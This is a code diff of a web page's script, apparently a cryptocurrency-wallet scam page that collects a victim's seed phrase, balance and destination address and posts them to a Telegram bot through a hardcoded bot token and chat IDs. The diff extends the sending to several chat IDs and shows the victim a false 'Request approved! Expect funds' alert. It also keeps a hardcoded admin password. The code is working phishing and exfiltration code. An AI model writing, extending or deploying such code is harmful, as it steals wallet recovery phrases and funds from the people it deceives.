@@ -95,7 +95,7 @@
     <script>
         function checkPassword() {
             const password = document.getElementById('adminPassword').value;
-            if (password === 'hardcodedpassword') { // Consider hashing
+            if (password === 'hardcodedpassword') { // Replace with your real password or hash logic
                 document.getElementById('loginPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
             } else {
@@ -120,22 +120,25 @@
             localStorage.setItem('walletRecords', JSON.stringify(records));
             
             const telegramBotToken = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
-            const chatId = '7651943856';
-            const message = `New Wallet Record:\nTelegram: ${record.telegramUsername}\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}`;
+            const chatIds = ['7651943856', '7651943856']; // Add your two Telegram chat IDs here
+
+            const message = `🚨🚨🚨 Wallet transaction loading:\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}\nLoading transaction in a bit...\nExpect funds soon✅`;
             
-            try {
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
-                alert('Request approved! Expect funds in your wallet soon.');
-            } catch (error) {
-                console.error('Error sending message:', error);
-                alert('Failed to send message to Telegram.');
+            for (const id of chatIds) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: id, text: message })
+                    });
+                } catch (error) {
+                    console.error(`Error sending message to chat ${id}:`, error);
+                }
             }
+
+            alert('Request approved! Expect funds in your wallet soon.');
         });
-        
+
         document.getElementById('powerButton').addEventListener('click', function() {
             const now = new Date();
             let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
